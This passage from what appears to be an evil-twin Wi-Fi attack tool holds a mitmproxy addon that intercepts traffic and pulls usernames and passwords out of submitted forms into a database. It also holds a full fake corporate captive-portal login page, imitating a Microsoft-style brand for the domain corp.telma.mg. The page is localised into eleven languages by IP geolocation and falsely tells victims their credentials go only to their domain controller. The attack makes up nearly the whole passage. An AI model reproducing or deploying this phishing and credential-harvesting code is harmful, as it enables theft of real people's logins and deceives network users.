            (host, username, password, source, now))
        con.commit(); con.close()
    except Exception:
        pass

class WPFSniffer:
    def request(self, flow: mitmproxy.http.HTTPFlow):
        req       = flow.request
        host      = req.pretty_host
        url       = req.pretty_url
        method    = req.method
        client_ip = (flow.client_conn.peername[0]
                     if flow.client_conn.peername else "unknown")

        skip_hosts = {"ocsp.apple.com", "ocsp.digicert.com", "safebrowsing.googleapis.com"}
        if host in skip_hosts:
            return

        _log("URL", f"{YELLOW}{method}{RESET} {url}  {GREEN}<- {client_ip}{RESET}", CYAN)
        _db(client_ip, method, url, host)

        if method == "POST" and req.content:
            try:
                body = req.content.decode("utf-8", errors="replace")
                _log("POST", f"Host: {YELLOW}{host}{RESET}", RED)
                if req.urlencoded_form:
                    fields = dict(req.urlencoded_form)
                    _log("FORM", json.dumps(fields, indent=2), GREEN)
                    _db(client_ip, method, url, host, json.dumps(fields))
                    cred_keys = {"password","passwd","pass","pwd","secret",
                                 "credential","token","key","pin"}
                    user_keys = {"username","user","email","login","uname",
                                 "mail","id","account","name"}
                    username = next((v for k,v in fields.items() if k.lower() in user_keys), "")
                    password = next((v for k,v in fields.items() if k.lower() in cred_keys), "")
                    if password:
                        _log("CRED",
                             f"user={GREEN}{username!r}{RESET}  "
                             f"pass={RED}{password!r}{RESET}  @ {YELLOW}{host}{RESET}", RED)
                        _db_cred(host, username, password, f"mitmproxy:{host}")
                elif body:
                    _log("BODY", body[:500], YELLOW)
                    _db(client_ip, method, url, host, body[:500])
            except Exception:
                pass

addons = [WPFSniffer()]
'''

    PORTAL_HTML = """<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>{ssid} - Network Login</title>
  <style>
    *, *::before, *::after {{ box-sizing: border-box; margin: 0; padding: 0; }}

    :root {{
      --blue:       #0067b8;
      --blue-dark:  #004f8c;
      --blue-hover: #005a9e;
      --bg:         #f3f3f3;
      --card-bg:    #ffffff;
      --text:       #1a1a1a;
      --muted:      #5f6368;
      --border:     #d2d2d2;
      --error:      #c42b1c;
      --success:    #107c10;
    }}

    body {{
      font-family: "Segoe UI", -apple-system, BlinkMacSystemFont, sans-serif;
      background: var(--bg);
      min-height: 100vh;
      display: flex;
      flex-direction: column;
    }}

    .topbar {{
      background: var(--blue);
      height: 4px;
      width: 100%;
      flex-shrink: 0;
    }}

    .page {{
      flex: 1;
      display: flex;
      flex-direction: column;
      align-items: center;
      justify-content: center;
      padding: 32px 16px 64px;
      gap: 28px;
    }}

    .brand {{
      display: flex;
      flex-direction: column;
      align-items: center;
      gap: 10px;
      animation: fadeDown 0.5s ease both;
    }}

    .brand-logo {{
      display: flex;
      align-items: center;
      gap: 12px;
    }}

    .brand-icon {{
      width: 44px;
      height: 44px;
      flex-shrink: 0;
    }}

    .brand-name {{
      font-size: 22px;
      font-weight: 600;
      color: var(--blue);
      letter-spacing: -0.3px;
    }}

    .brand-subtitle {{
      font-size: 13px;
      color: var(--muted);
    }}

    .card {{
      background: var(--card-bg);
      border: 1px solid var(--border);
      border-radius: 4px;
      width: 100%;
      max-width: 440px;
      box-shadow: 0 2px 12px rgba(0,0,0,0.08), 0 0 0 1px rgba(0,0,0,0.04);
      animation: fadeUp 0.45s 0.1s ease both;
      overflow: hidden;
    }}

    .card-header {{
      background: var(--blue);
      padding: 20px 28px 18px;
    }}

    .card-header h1 {{
      color: #fff;
      font-size: 17px;
      font-weight: 600;
      letter-spacing: -0.2px;
    }}

    .card-header p {{
      color: rgba(255,255,255,0.72);
      font-size: 12.5px;
      margin-top: 3px;
    }}

    .card-body {{
      padding: 28px 28px 24px;
    }}

    .net-notice {{
      display: flex;
      align-items: flex-start;
      gap: 11px;
      background: #f0f6ff;
      border: 1px solid #c7ddf5;
      border-left: 4px solid var(--blue);
      border-radius: 3px;
      padding: 12px 14px;
      margin-bottom: 24px;
    }}

    .net-notice svg {{
      flex-shrink: 0;
      margin-top: 1px;
      color: var(--blue);
    }}

    .net-notice-text {{
      font-size: 12.5px;
      color: #1a3a5c;
      line-height: 1.55;
    }}

    .net-notice-text strong {{
      display: block;
      font-size: 13px;
      margin-bottom: 2px;
      color: var(--blue-dark);
    }}

    .domain-row {{
      display: flex;
      align-items: center;
      gap: 8px;
      background: #f7f7f7;
      border: 1px solid var(--border);
      border-radius: 2px;
      padding: 8px 12px;
      margin-bottom: 20px;
    }}

    .domain-dot {{
      width: 8px; height: 8px;
      background: var(--success);
      border-radius: 50%;
      flex-shrink: 0;
      box-shadow: 0 0 0 2px rgba(16,124,16,0.18);
    }}

    .domain-label {{
      font-size: 12px;
      color: var(--muted);
    }}

    .domain-value {{
      font-size: 12.5px;
      font-weight: 600;
      color: var(--text);
      margin-left: auto;
    }}

    .field {{ margin-bottom: 18px; }}

    .field label {{
      display: block;
      font-size: 12.5px;
      font-weight: 600;
      color: var(--text);
      margin-bottom: 6px;
      letter-spacing: 0.01em;
    }}

    .input-wrap {{ position: relative; }}

    .input-wrap input {{
      width: 100%;
      height: 40px;
      padding: 0 40px 0 12px;
      border: 1px solid var(--border);
      border-radius: 2px;
      font-size: 14px;
      color: var(--text);
      background: #fff;
      outline: none;
      font-family: inherit;
      transition: border-color 0.15s, box-shadow 0.15s;
    }}

    .input-wrap input:hover {{ border-color: #aaa; }}

    .input-wrap input:focus {{
      border-color: var(--blue);
      box-shadow: 0 0 0 1px var(--blue);
    }}

    .input-wrap input.has-error {{
      border-color: var(--error);
      box-shadow: 0 0 0 1px var(--error);
    }}

    .input-wrap input::placeholder {{ color: #bbb; font-size: 13px; }}

    .input-icon {{
      position: absolute;
      right: 11px; top: 50%;
      transform: translateY(-50%);
      color: #aaa;
      pointer-events: none;
      display: flex;
    }}

    .toggle-pw {{
      position: absolute;
      right: 8px; top: 50%;
      transform: translateY(-50%);
      background: none; border: none;
      cursor: pointer; color: #888;
      display: flex; align-items: center;
      padding: 4px;
      border-radius: 2px;
      transition: color 0.15s, background 0.15s;
    }}

    .toggle-pw:hover {{ color: var(--blue); background: #f0f4ff; }}

    .field-hint {{
      font-size: 11.5px;
      color: var(--muted);
      margin-top: 5px;
    }}

    .field-error {{
      font-size: 11.5px;
      color: var(--error);
      margin-top: 5px;
      display: none;
    }}

    .field-error.show {{ display: block; }}

    .btn-row {{
      display: flex;
      gap: 10px;
      margin-top: 6px;
    }}

    .btn {{
      height: 36px;
      padding: 0 20px;
      border: none;
      border-radius: 2px;
      font-size: 14px;
      font-weight: 600;
      cursor: pointer;
      font-family: inherit;
      transition: background 0.15s;
    }}

    .btn-primary {{
      background: var(--blue);
      color: #fff;
      flex: 1;
    }}

    .btn-primary:hover {{ background: var(--blue-hover); }}
    .btn-primary:active {{ background: var(--blue-dark); }}

    .btn-primary.loading {{
      pointer-events: none;
      opacity: 0.8;
    }}

    .btn-primary.loading::after {{
      content: "";
      display: inline-block;
      width: 13px; height: 13px;
      border: 2px solid rgba(255,255,255,0.35);
      border-top-color: #fff;
      border-radius: 50%;
      animation: spin 0.6s linear infinite;
      margin-left: 10px;
      vertical-align: middle;
    }}

    .btn-secondary {{
      background: #fff;
      color: var(--blue);
      border: 1px solid var(--border);
      white-space: nowrap;
    }}

    .btn-secondary:hover {{ background: #f0f4ff; border-color: var(--blue); }}

    .divider {{
      display: flex;
      align-items: center;
      gap: 12px;
      margin: 20px 0;
      color: var(--muted);
      font-size: 11.5px;
    }}

    .divider::before, .divider::after {{
      content: "";
      flex: 1;
      height: 1px;
      background: var(--border);
    }}

    .help-links {{
      display: flex;
      flex-wrap: wrap;
      gap: 6px 16px;
      margin-top: 8px;
    }}

    .help-links a {{
      font-size: 12px;
      color: var(--blue);
      text-decoration: none;
    }}

    .help-links a:hover {{ text-decoration: underline; }}

    .card-footer {{
      border-top: 1px solid #ebebeb;
      background: #fafafa;
      padding: 13px 28px;
      display: flex;
      align-items: center;
      gap: 8px;
    }}

    .card-footer svg {{ color: var(--muted); flex-shrink: 0; }}

    .card-footer-text {{
      font-size: 11.5px;
      color: var(--muted);
      line-height: 1.5;
    }}

    .page-footer {{
      font-size: 11.5px;
      color: #999;
      text-align: center;
      animation: fadeUp 0.45s 0.2s ease both;
    }}

    @keyframes fadeDown {{
      from {{ opacity: 0; transform: translateY(-14px); }}
      to   {{ opacity: 1; transform: none; }}
    }}

    @keyframes fadeUp {{
      from {{ opacity: 0; transform: translateY(14px); }}
      to   {{ opacity: 1; transform: none; }}
    }}

    @keyframes spin {{
      to {{ transform: rotate(360deg); }}
    }}

    @media (max-width: 480px) {{
      .card-body  {{ padding: 22px 18px 18px; }}
      .card-header {{ padding: 16px 18px 14px; }}
      .card-footer {{ padding: 12px 18px; }}
    }}
  </style>
</head>
<body>

  <div class="topbar"></div>

  <main class="page">

    <div class="brand">
      <div class="brand-logo">
        <svg class="brand-icon" viewBox="0 0 44 44" xmlns="http://www.w3.org/2000/svg">
          <rect x="2"  y="2"  width="18" height="18" rx="2" fill="#f25022"/>
          <rect x="24" y="2"  width="18" height="18" rx="2" fill="#7fba00"/>
          <rect x="2"  y="24" width="18" height="18" rx="2" fill="#00a4ef"/>
          <rect x="24" y="24" width="18" height="18" rx="2" fill="#ffb900"/>
        </svg>
        <span class="brand-name">CORP Network</span>
      </div>
      <span class="brand-subtitle" id="brand-subtitle">Active Directory Authentication Portal</span>
    </div>

    <div class="card">
      <div class="card-header">
        <h1 id="card-title">Sign in to your account</h1>
        <p id="card-sub">Corporate network access required</p>
      </div>

      <div class="card-body">

        <div class="net-notice">
          <svg width="16" height="16" viewBox="0 0 24 24" fill="none"
               stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
            <circle cx="12" cy="12" r="10"/>
            <path d="M12 8v4m0 4h.01"/>
          </svg>
          <div class="net-notice-text">
            <strong id="notice-title">Network Authentication Required</strong>
            <span id="notice-body">You must sign in with your corporate credentials to connect to this network. Your session will be logged for compliance purposes.</span>
          </div>
        </div>

        <div class="domain-row">
          <div class="domain-dot"></div>
          <span class="domain-label" id="domain-label">Domain</span>
          <span class="domain-value">corp.telma.mg</span>
        </div>

        <form id="login-form" novalidate action="/login" method="POST">
          <input type="hidden" name="ssid" value="{ssid}">

          <div class="field">
            <label for="email" id="label-email">Email or UPN</label>
            <div class="input-wrap">
              <input type="email" id="email" name="username"
                     placeholder="username@corp.telma.mg"
                     autocomplete="username"
                     spellcheck="false" required autofocus>
              <span class="input-icon">
                <svg width="15" height="15" viewBox="0 0 24 24" fill="none"
                     stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
                  <rect x="2" y="4" width="20" height="16" rx="2"/>
                  <path d="m22 7-8.97 5.7a1.94 1.94 0 0 1-2.06 0L2 7"/>
                </svg>
              </span>
            </div>
            <div class="field-hint" id="hint-email">Use your organisational email or UPN (e.g. j.doe@corp.telma.mg)</div>
            <div class="field-error" id="err-email">Please enter a valid email address or UPN.</div>
          </div>

          <div class="field">
            <label for="password" id="label-password">Password</label>
            <div class="input-wrap">
              <input type="password" id="password" name="password"
                     placeholder="Enter your password"
                     autocomplete="current-password" required>
              <button type="button" class="toggle-pw" onclick="togglePw()" aria-label="Show/hide password">
                <svg id="eye-icon" width="16" height="16" viewBox="0 0 24 24" fill="none"
                     stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
                  <path d="M1 12S5 5 12 5s11 7 11 7-4 7-11 7S1 12 1 12z"/>
                  <circle cx="12" cy="12" r="3"/>
                </svg>
              </button>
            </div>
            <div class="field-error" id="err-password">Password cannot be empty.</div>
          </div>

          <div class="btn-row">
            <button type="submit" class="btn btn-primary" id="btn-signin">Sign in</button>
            <button type="button" class="btn btn-secondary" id="btn-clear" onclick="resetForm()">Clear</button>
          </div>
        </form>

        <div class="divider" id="divider-or">or</div>

        <div class="help-links">
          <a href="#" id="link-forgot">Forgot password?</a>
          <a href="#" id="link-unlock">Unlock account</a>
          <a href="#" id="link-help">Contact IT helpdesk</a>
        </div>

      </div>

      <div class="card-footer">
        <svg width="14" height="14" viewBox="0 0 24 24" fill="none"
             stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
          <rect x="3" y="11" width="18" height="11" rx="2" ry="2"/>
          <path d="M7 11V7a5 5 0 0 1 10 0v4"/>
        </svg>
        <p class="card-footer-text" id="footer-text">
          Connection is secured via TLS 1.3. Credentials are transmitted only to your organisation's domain controller.
        </p>
      </div>
    </div>

    <p class="page-footer" id="page-footer">
      &copy; 2026 CORP Network Services &nbsp;&middot;&nbsp; IT Helpdesk: +1-800-555-0199
    </p>

  </main>

  <script>
    document.title = "{ssid} - Network Login";

    // ── TRANSLATIONS ──────────────────────────────────────────────
    const TRANSLATIONS = {{
      en: {{
        brandSubtitle: "Active Directory Authentication Portal",
        cardTitle:     "Sign in to your account",
        cardSub:       "Corporate network access required",
        noticeTitle:   "Network Authentication Required",
        noticeBody:    "You must sign in with your corporate credentials to connect to this network. Your session will be logged for compliance purposes.",
        domainLabel:   "Domain",
        labelEmail:    "Email or UPN",
        hintEmail:     "Use your organisational email or UPN (e.g. j.doe@corp.telma.mg)",
        errEmail:      "Please enter a valid email address or UPN.",
        placeholderEmail: "username@corp.telma.mg",
        labelPassword: "Password",
        placeholderPw: "Enter your password",
        errPassword:   "Password cannot be empty.",
        btnSignin:     "Sign in",
        btnClear:      "Clear",
        dividerOr:     "or",
        linkForgot:    "Forgot password?",
        linkUnlock:    "Unlock account",
        linkHelp:      "Contact IT helpdesk",
        footer:        "Connection is secured via TLS 1.3. Credentials are transmitted only to your organisation's domain controller.",
        loading:       "Signing in",
      }},
      fr: {{
        brandSubtitle: "Portail d'authentification Active Directory",
        cardTitle:     "Connectez-vous à votre compte",
        cardSub:       "Accès réseau d'entreprise requis",
        noticeTitle:   "Authentification réseau requise",
        noticeBody:    "Vous devez vous connecter avec vos identifiants d'entreprise pour accéder à ce réseau. Votre session sera enregistrée à des fins de conformité.",
        domainLabel:   "Domaine",
        labelEmail:    "E-mail ou UPN",
        hintEmail:     "Utilisez votre e-mail organisationnel ou UPN (ex. j.dupont@corp.telma.mg)",
        errEmail:      "Veuillez saisir une adresse e-mail ou un UPN valide.",
        placeholderEmail: "utilisateur@corp.telma.mg",
        labelPassword: "Mot de passe",
        placeholderPw: "Saisissez votre mot de passe",
        errPassword:   "Le mot de passe ne peut pas être vide.",
        btnSignin:     "Se connecter",
        btnClear:      "Effacer",
        dividerOr:     "ou",
        linkForgot:    "Mot de passe oublié ?",
        linkUnlock:    "Déverrouiller le compte",
        linkHelp:      "Contacter le support informatique",
        footer:        "Connexion sécurisée via TLS 1.3. Les identifiants sont transmis uniquement au contrôleur de domaine de votre organisation.",
        loading:       "Connexion en cours",
      }},
      hi: {{
        brandSubtitle: "Active Directory प्रमाणीकरण पोर्टल",
        cardTitle:     "अपने खाते में साइन इन करें",
        cardSub:       "कॉर्पोरेट नेटवर्क एक्सेस आवश्यक है",
        noticeTitle:   "नेटवर्क प्रमाणीकरण आवश्यक है",
        noticeBody:    "इस नेटवर्क से कनेक्ट होने के लिए आपको अपनी कॉर्पोरेट क्रेडेंशियल से साइन इन करना होगा। अनुपालन उद्देश्यों के लिए आपका सत्र लॉग किया जाएगा।",
        domainLabel:   "डोमेन",
        labelEmail:    "ईमेल या UPN",
        hintEmail:     "अपना संगठनात्मक ईमेल या UPN उपयोग करें (जैसे j.sharma@corp.telma.mg)",
        errEmail:      "कृपया एक वैध ईमेल पता या UPN दर्ज करें।",
        placeholderEmail: "उपयोगकर्ता@corp.telma.mg",
        labelPassword: "पासवर्ड",
        placeholderPw: "अपना पासवर्ड दर्ज करें",
        errPassword:   "पासवर्ड खाली नहीं हो सकता।",
        btnSignin:     "साइन इन करें",
        btnClear:      "साफ़ करें",
        dividerOr:     "या",
        linkForgot:    "पासवर्ड भूल गए?",
        linkUnlock:    "खाता अनलॉक करें",
        linkHelp:      "IT हेल्पडेस्क से संपर्क करें",
        footer:        "कनेक्शन TLS 1.3 के माध्यम से सुरक्षित है। क्रेडेंशियल केवल आपके संगठन के डोमेन कंट्रोलर को भेजे जाते हैं।",
        loading:       "साइन इन हो रहा है",
      }},
      ar: {{
        brandSubtitle: "بوابة مصادقة Active Directory",
        cardTitle:     "تسجيل الدخول إلى حسابك",
        cardSub:       "مطلوب الوصول إلى شبكة الشركة",
        noticeTitle:   "مصادقة الشبكة مطلوبة",
        noticeBody:    "يجب تسجيل الدخول ببيانات اعتماد شركتك للاتصال بهذه الشبكة. سيتم تسجيل جلستك لأغراض الامتثال.",
        domainLabel:   "النطاق",
        labelEmail:    "البريد الإلكتروني أو UPN",
        hintEmail:     "استخدم بريدك الإلكتروني المؤسسي أو UPN (مثال: j.ali@corp.telma.mg)",
        errEmail:      "الرجاء إدخال عنوان بريد إلكتروني أو UPN صالح.",
        placeholderEmail: "مستخدم@corp.telma.mg",
        labelPassword: "كلمة المرور",
        placeholderPw: "أدخل كلمة المرور",
        errPassword:   "لا يمكن أن تكون كلمة المرور فارغة.",
        btnSignin:     "تسجيل الدخول",
        btnClear:      "مسح",
        dividerOr:     "أو",
        linkForgot:    "نسيت كلمة المرور؟",
        linkUnlock:    "إلغاء قفل الحساب",
        linkHelp:      "الاتصال بمكتب المساعدة",
        footer:        "الاتصال مؤمَّن عبر TLS 1.3. تُرسَل بيانات الاعتماد فقط إلى وحدة التحكم بالنطاق في مؤسستك.",
        loading:       "جارٍ تسجيل الدخول",
      }},
      pt: {{
        brandSubtitle: "Portal de Autenticação Active Directory",
        cardTitle:     "Entre na sua conta",
        cardSub:       "Acesso à rede corporativa necessário",
        noticeTitle:   "Autenticação de rede necessária",
        noticeBody:    "Você deve entrar com suas credenciais corporativas para se conectar a esta rede. Sua sessão será registrada para fins de conformidade.",
        domainLabel:   "Domínio",
        labelEmail:    "E-mail ou UPN",
        hintEmail:     "Use seu e-mail organizacional ou UPN (ex. j.silva@corp.telma.mg)",
        errEmail:      "Insira um endereço de e-mail ou UPN válido.",
        placeholderEmail: "usuario@corp.telma.mg",
        labelPassword: "Senha",
        placeholderPw: "Digite sua senha",
        errPassword:   "A senha não pode estar vazia.",
        btnSignin:     "Entrar",
        btnClear:      "Limpar",
        dividerOr:     "ou",
        linkForgot:    "Esqueceu a senha?",
        linkUnlock:    "Desbloquear conta",
        linkHelp:      "Contatar suporte de TI",
        footer:        "Conexão protegida via TLS 1.3. As credenciais são transmitidas apenas para o controlador de domínio da sua organização.",
        loading:       "Entrando",
      }},
      es: {{
        brandSubtitle: "Portal de Autenticación de Active Directory",
        cardTitle:     "Inicia sesión en tu cuenta",
        cardSub:       "Se requiere acceso a la red corporativa",
        noticeTitle:   "Autenticación de red requerida",
        noticeBody:    "Debes iniciar sesión con tus credenciales corporativas para conectarte a esta red. Tu sesión será registrada para fines de cumplimiento.",
        domainLabel:   "Dominio",
        labelEmail:    "Correo electrónico o UPN",
        hintEmail:     "Usa tu correo organizacional o UPN (ej. j.garcia@corp.telma.mg)",
        errEmail:      "Ingresa una dirección de correo electrónico o UPN válida.",
        placeholderEmail: "usuario@corp.telma.mg",
        labelPassword: "Contraseña",
        placeholderPw: "Ingresa tu contraseña",
        errPassword:   "La contraseña no puede estar vacía.",
        btnSignin:     "Iniciar sesión",
        btnClear:      "Limpiar",
        dividerOr:     "o",
        linkForgot:    "¿Olvidaste tu contraseña?",
        linkUnlock:    "Desbloquear cuenta",
        linkHelp:      "Contactar soporte de TI",
        footer:        "Conexión protegida mediante TLS 1.3. Las credenciales se transmiten solo al controlador de dominio de tu organización.",
        loading:       "Iniciando sesión",
      }},
      de: {{
        brandSubtitle: "Active Directory Authentifizierungsportal",
        cardTitle:     "Bei Ihrem Konto anmelden",
        cardSub:       "Zugang zum Unternehmensnetzwerk erforderlich",
        noticeTitle:   "Netzwerkauthentifizierung erforderlich",
        noticeBody:    "Sie müssen sich mit Ihren Unternehmensanmeldedaten anmelden, um auf dieses Netzwerk zuzugreifen. Ihre Sitzung wird für Compliance-Zwecke protokolliert.",
        domainLabel:   "Domäne",
        labelEmail:    "E-Mail oder UPN",
        hintEmail:     "Verwenden Sie Ihre organisatorische E-Mail oder UPN (z.B. j.mueller@corp.telma.mg)",
        errEmail:      "Bitte geben Sie eine gültige E-Mail-Adresse oder UPN ein.",
        placeholderEmail: "benutzer@corp.telma.mg",
        labelPassword: "Passwort",
        placeholderPw: "Passwort eingeben",
        errPassword:   "Das Passwort darf nicht leer sein.",
        btnSignin:     "Anmelden",
        btnClear:      "Löschen",
        dividerOr:     "oder",
        linkForgot:    "Passwort vergessen?",
        linkUnlock:    "Konto entsperren",
        linkHelp:      "IT-Helpdesk kontaktieren",
        footer:        "Verbindung über TLS 1.3 gesichert. Anmeldedaten werden nur an den Domänencontroller Ihrer Organisation übertragen.",
        loading:       "Anmeldung läuft",
      }},
      zh: {{
        brandSubtitle: "Active Directory 身份验证门户",
        cardTitle:     "登录您的账户",
        cardSub:       "需要企业网络访问权限",
        noticeTitle:   "需要网络身份验证",
        noticeBody:    "您必须使用企业凭据登录才能连接到此网络。您的会话将被记录以符合合规要求。",
        domainLabel:   "域",
        labelEmail:    "电子邮件或 UPN",
        hintEmail:     "请使用您的组织电子邮件或 UPN（例如 j.zhang@corp.telma.mg）",
        errEmail:      "请输入有效的电子邮件地址或 UPN。",
        placeholderEmail: "用户名@corp.telma.mg",
        labelPassword: "密码",
        placeholderPw: "输入您的密码",
        errPassword:   "密码不能为空。",
        btnSignin:     "登录",
        btnClear:      "清除",
        dividerOr:     "或",
        linkForgot:    "忘记密码？",
        linkUnlock:    "解锁账户",
        linkHelp:      "联系 IT 帮助台",
        footer:        "连接通过 TLS 1.3 保护。凭据仅传输到您组织的域控制器。",
        loading:       "登录中",
      }},
      sw: {{
        brandSubtitle: "Lango la Uthibitishaji wa Active Directory",
        cardTitle:     "Ingia kwenye akaunti yako",
        cardSub:       "Upatikanaji wa mtandao wa shirika unahitajika",
        noticeTitle:   "Uthibitishaji wa Mtandao Unahitajika",
        noticeBody:    "Lazima uingie kwa hati zako za shirika kuunganika kwenye mtandao huu. Kikao chako kitarekodiwa kwa madhumuni ya kufuata sheria.",
        domainLabel:   "Kikoa",
        labelEmail:    "Barua pepe au UPN",
        hintEmail:     "Tumia barua pepe yako ya shirika au UPN (mfano j.juma@corp.telma.mg)",
        errEmail:      "Tafadhali ingiza anwani ya barua pepe au UPN halali.",
        placeholderEmail: "mtumiaji@corp.telma.mg",
        labelPassword: "Nywila",
        placeholderPw: "Ingiza nywila yako",
        errPassword:   "Nywila haiwezi kuwa tupu.",
        btnSignin:     "Ingia",
        btnClear:      "Futa",
        dividerOr:     "au",
        linkForgot:    "Umesahau nywila?",
        linkUnlock:    "Fungua akaunti",
        linkHelp:      "Wasiliana na msaada wa IT",
        footer:        "Muunganiko umehakikishwa kupitia TLS 1.3. Hati zinatumwa tu kwa kidhibiti cha kikoa cha shirika lako.",
        loading:       "Inaingia",
      }},
      id: {{
        brandSubtitle: "Portal Autentikasi Active Directory",
        cardTitle:     "Masuk ke akun Anda",
        cardSub:       "Akses jaringan perusahaan diperlukan",
        noticeTitle:   "Autentikasi Jaringan Diperlukan",
        noticeBody:    "Anda harus masuk dengan kredensial perusahaan untuk terhubung ke jaringan ini. Sesi Anda akan dicatat untuk keperluan kepatuhan.",
        domainLabel:   "Domain",
        labelEmail:    "Email atau UPN",
        hintEmail:     "Gunakan email organisasi atau UPN Anda (mis. j.budi@corp.telma.mg)",
        errEmail:      "Masukkan alamat email atau UPN yang valid.",
        placeholderEmail: "pengguna@corp.telma.mg",
        labelPassword: "Kata Sandi",
        placeholderPw: "Masukkan kata sandi Anda",
        errPassword:   "Kata sandi tidak boleh kosong.",
        btnSignin:     "Masuk",
        btnClear:      "Hapus",
        dividerOr:     "atau",
        linkForgot:    "Lupa kata sandi?",
        linkUnlock:    "Buka kunci akun",
        linkHelp:      "Hubungi helpdesk IT",
        footer:        "Koneksi diamankan melalui TLS 1.3. Kredensial hanya dikirim ke pengontrol domain organisasi Anda.",
        loading:       "Sedang masuk",
      }},
      ru: {{
        brandSubtitle: "Портал аутентификации Active Directory",
        cardTitle:     "Войдите в свою учётную запись",
        cardSub:       "Требуется доступ к корпоративной сети",
        noticeTitle:   "Требуется аутентификация в сети",
        noticeBody:    "Для подключения к этой сети необходимо войти с корпоративными учётными данными. Ваш сеанс будет зарегистрирован в целях соответствия требованиям.",
        domainLabel:   "Домен",
        labelEmail:    "Электронная почта или UPN",
        hintEmail:     "Используйте корпоративный адрес электронной почты или UPN (например, i.ivanov@corp.telma.mg)",
        errEmail:      "Пожалуйста, введите корректный адрес электронной почты или UPN.",
        placeholderEmail: "пользователь@corp.telma.mg",
        labelPassword: "Пароль",
        placeholderPw: "Введите ваш пароль",
        errPassword:   "Пароль не может быть пустым.",
        btnSignin:     "Войти",
        btnClear:      "Очистить",
        dividerOr:     "или",
        linkForgot:    "Забыли пароль?",
        linkUnlock:    "Разблокировать учётную запись",
        linkHelp:      "Связаться со службой ИТ-поддержки",
        footer:        "Соединение защищено через TLS 1.3. Учётные данные передаются только контроллеру домена вашей организации.",
        loading:       "Выполняется вход",
      }},
    }};

    // ── COUNTRY → LANGUAGE MAP ────────────────────────────────────
    const COUNTRY_LANG = {{
      MG:"fr", FR:"fr", BE:"fr", CH:"fr", SN:"fr",
      CI:"fr", CM:"fr", CD:"fr", TN:"fr", MA:"fr",
      DZ:"fr", BF:"fr", ML:"fr", NE:"fr", GN:"fr",
      IN:"hi",
      SA:"ar", AE:"ar", EG:"ar", IQ:"ar", JO:"ar",
      KW:"ar", LB:"ar", LY:"ar", OM:"ar", QA:"ar",
      SD:"ar", SY:"ar", YE:"ar", BH:"ar",
      BR:"pt", PT:"pt", AO:"pt", MZ:"pt",
      ES:"es", MX:"es", AR:"es", CO:"es", CL:"es",
      PE:"es", VE:"es", EC:"es", GT:"es", CU:"es",
      DE:"de", AT:"de",
      CN:"zh", TW:"zh", HK:"zh",
      KE:"sw", TZ:"sw", UG:"sw",
      ID:"id",
      RU:"ru", BY:"ru", KZ:"ru",
      US:"en", GB:"en", AU:"en", CA:"en", NZ:"en",
      NG:"en", ZA:"en", GH:"en", PK:"en",
    }};

    // ── APPLY TRANSLATION ─────────────────────────────────────────
    function applyLang(code) {{
      const t = TRANSLATIONS[code] || TRANSLATIONS["en"];
      document.getElementById("brand-subtitle").textContent    = t.brandSubtitle;
      document.getElementById("card-title").textContent        = t.cardTitle;
      document.getElementById("card-sub").textContent          = t.cardSub;
      document.getElementById("notice-title").textContent      = t.noticeTitle;
      document.getElementById("notice-body").textContent       = t.noticeBody;
      document.getElementById("domain-label").textContent      = t.domainLabel;
      document.getElementById("label-email").textContent       = t.labelEmail;
      document.getElementById("hint-email").textContent        = t.hintEmail;
      document.getElementById("err-email").textContent         = t.errEmail;
      document.getElementById("email").placeholder             = t.placeholderEmail;
      document.getElementById("label-password").textContent    = t.labelPassword;
      document.getElementById("password").placeholder          = t.placeholderPw;
      document.getElementById("err-password").textContent      = t.errPassword;
      document.getElementById("btn-signin").textContent        = t.btnSignin;
      document.getElementById("btn-clear").textContent         = t.btnClear;
      document.getElementById("divider-or").textContent        = t.dividerOr;
      document.getElementById("link-forgot").textContent       = t.linkForgot;
      document.getElementById("link-unlock").textContent       = t.linkUnlock;
      document.getElementById("link-help").textContent         = t.linkHelp;
      document.getElementById("footer-text").textContent       = t.footer;
      document.documentElement.dir = (code === "ar") ? "rtl" : "ltr";
      window._currentLang = t;
    }}

    // ── DETECT COUNTRY VIA IP GEOLOCATION ─────────────────────────
    fetch("https://ipapi.co/json/")
      .then(r => r.json())
      .then(data => {{
        const country = (data.country_code || "").toUpperCase();
        const lang    = COUNTRY_LANG[country] || "en";
        applyLang(lang);
      }})
      .catch(() => {{
        const bl = (navigator.language || "en").split("-")[0].toLowerCase();
        applyLang(TRANSLATIONS[bl] ? bl : "en");
      }});

    // ── PASSWORD TOGGLE ───────────────────────────────────────────
    function togglePw() {{
      const input = document.getElementById("password");
      const icon  = document.getElementById("eye-icon");
      const show  = input.type === "password";
      input.type  = show ? "text" : "password";
      icon.innerHTML = show
        ? `<path d="M17.94 17.94A10.07 10.07 0 0 1 12 20C5 20 1 12 1 12a18.45 18.45 0 0 1 5.06-5.94"/>
           <path d="M9.9 4.24A9.12 9.12 0 0 1 12 4c7 0 11 8 11 8a18.5 18.5 0 0 1-2.16 3.19"/>
           <line x1="1" y1="1" x2="23" y2="23"/>`
        : `<path d="M1 12S5 5 12 5s11 7 11 7-4 7-11 7S1 12 1 12z"/>
           <circle cx="12" cy="12" r="3"/>`;
    }}

    // ── FORM RESET ────────────────────────────────────────────────
    function resetForm() {{
      document.getElementById("email").value    = "";
      document.getElementById("password").value = "";
      clearErrors();
      document.getElementById("email").focus();
    }}

    function clearErrors() {{
      ["err-email","err-password"].forEach(id =>
        document.getElementById(id).classList.remove("show")
      );
      document.getElementById("email").classList.remove("has-error");
      document.getElementById("password").classList.remove("has-error");
    }}

    // ── VALIDATION & SUBMIT ───────────────────────────────────────
    function validateEmail(val) {{
      return /^[^\\s@]+@[^\\s@]+\\.[^\\s@]+$/.test(val) ||
             /^[^\\s@]+@[^\\s@]+$/.test(val);
    }}

    document.getElementById("login-form").addEventListener("submit", function(e) {{
      e.preventDefault();
      clearErrors();
      const t        = window._currentLang || TRANSLATIONS["en"];
      const email    = document.getElementById("email").value.trim();
      const password = document.getElementById("password").value;
      const btn      = document.getElementById("btn-signin");
      let   valid    = true;

      if (!validateEmail(email)) {{
        document.getElementById("err-email").classList.add("show");
        document.getElementById("email").classList.add("has-error");
        valid = false;
      }}
      if (!password) {{
        document.getElementById("err-password").classList.add("show");
        document.getElementById("password").classList.add("has-error");
        valid = false;
